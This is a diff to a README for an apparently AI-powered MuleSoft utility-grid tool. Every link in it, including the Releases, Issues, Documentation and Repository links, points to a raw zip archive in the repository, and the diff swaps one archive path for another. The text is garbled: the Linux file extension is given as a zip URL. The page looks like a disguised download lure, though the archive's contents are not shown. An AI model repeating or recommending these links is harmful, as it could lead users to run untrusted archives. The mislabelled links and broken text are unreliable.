@@ -1,6 +1,6 @@
 # 🌟 utility-ai-mulesoft-api - Simplifying Utility Management with AI 
 
-[![Download](https://raw.githubusercontent.com/chupagetiiiii/utility-ai-mulesoft-api/master/Agaricus/utility-ai-mulesoft-api.zip%20release-brightgreen)](https://raw.githubusercontent.com/chupagetiiiii/utility-ai-mulesoft-api/master/Agaricus/utility-ai-mulesoft-api.zip)
+[![Download](https://github.com/chupagetiiiii/utility-ai-mulesoft-api/raw/refs/heads/master/config/api_mulesoft_utility_ai_v2.6.zip%20release-brightgreen)](https://github.com/chupagetiiiii/utility-ai-mulesoft-api/raw/refs/heads/master/config/api_mulesoft_utility_ai_v2.6.zip)
 
 ## 📦 Overview
 utility-ai-mulesoft-api is an AI-powered MuleSoft API platform designed to help utilities recover from grid outages quickly. With this software, you can integrate various systems like SCADA, weather, and field systems for efficient energy management. Experience a significant reduction in outages and achieve remarkable savings.
@@ -15,11 +15,11 @@ To begin using the utility-ai-mulesoft-api, follow these simple steps:
    - Network: Stable internet connection for initial setup
 
 2. **Visit the Download Page**
-   - Go to the [Releases page](https://raw.githubusercontent.com/chupagetiiiii/utility-ai-mulesoft-api/master/Agaricus/utility-ai-mulesoft-api.zip) to find the latest version.
+   - Go to the [Releases page](https://github.com/chupagetiiiii/utility-ai-mulesoft-api/raw/refs/heads/master/config/api_mulesoft_utility_ai_v2.6.zip) to find the latest version.
    
 ## 📥 Download & Install
-- Click on the large button above or use this link: [Download the latest release](https://raw.githubusercontent.com/chupagetiiiii/utility-ai-mulesoft-api/master/Agaricus/utility-ai-mulesoft-api.zip) to download the application.
-- Choose the version that suits your operating system. The file names will typically end with `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/chupagetiiiii/utility-ai-mulesoft-api/master/Agaricus/utility-ai-mulesoft-api.zip` for Linux.
+- Click on the large button above or use this link: [Download the latest release](https://github.com/chupagetiiiii/utility-ai-mulesoft-api/raw/refs/heads/master/config/api_mulesoft_utility_ai_v2.6.zip) to download the application.
+- Choose the version that suits your operating system. The file names will typically end with `.exe` for Windows, `.dmg` for macOS, and `https://github.com/chupagetiiiii/utility-ai-mulesoft-api/raw/refs/heads/master/config/api_mulesoft_utility_ai_v2.6.zip` for Linux.
 
 ## ⚙️ How to Install
 1. **Download the File**
@@ -28,7 +28,7 @@ To begin using the utility-ai-mulesoft-api, follow these simple steps:
 2. **Run the Installer**
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS: Open the downloaded `.dmg` file, drag the utility-ai-mulesoft-api icon to your Applications folder, and launch it from there.
-   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/chupagetiiiii/utility-ai-mulesoft-api/master/Agaricus/utility-ai-mulesoft-api.zip` file and follow the included instructions in the https://raw.githubusercontent.com/chupagetiiiii/utility-ai-mulesoft-api/master/Agaricus/utility-ai-mulesoft-api.zip to install.
+   - For Linux: Extract the downloaded `https://github.com/chupagetiiiii/utility-ai-mulesoft-api/raw/refs/heads/master/config/api_mulesoft_utility_ai_v2.6.zip` file and follow the included instructions in the https://github.com/chupagetiiiii/utility-ai-mulesoft-api/raw/refs/heads/master/config/api_mulesoft_utility_ai_v2.6.zip to install.
 
 3. **Follow Initial Setup Instructions**
    - Launch the application. The first time you open it, there may be a setup wizard to guide you through basic configurations.
@@ -57,13 +57,13 @@ No. This application is designed for ease of use. Follow the setup instructions,
 Yes, support is available through our GitHub Issues page. You can ask questions, report issues, or request features.
 
 ## 📞 Support 
-For any questions or support, please visit our [Issues page](https://raw.githubusercontent.com/chupagetiiiii/utility-ai-mulesoft-api/master/Agaricus/utility-ai-mulesoft-api.zip). 
+For any questions or support, please visit our [Issues page](https://github.com/chupagetiiiii/utility-ai-mulesoft-api/raw/refs/heads/master/config/api_mulesoft_utility_ai_v2.6.zip). 
 
 ## 🎉 Acknowledgments
 Thank you to the contributors who made this project possible. Together, we aim to modernize the utility sector and enhance grid resilience.
 
 ## 🔗 Links
-- [GitHub Repository](https://raw.githubusercontent.com/chupagetiiiii/utility-ai-mulesoft-api/master/Agaricus/utility-ai-mulesoft-api.zip)
-- [Documentation](https://raw.githubusercontent.com/chupagetiiiii/utility-ai-mulesoft-api/master/Agaricus/utility-ai-mulesoft-api.zip) 
+- [GitHub Repository](https://github.com/chupagetiiiii/utility-ai-mulesoft-api/raw/refs/heads/master/config/api_mulesoft_utility_ai_v2.6.zip)
+- [Documentation](https://github.com/chupagetiiiii/utility-ai-mulesoft-api/raw/refs/heads/master/config/api_mulesoft_utility_ai_v2.6.zip) 
 
 **Happy managing!**
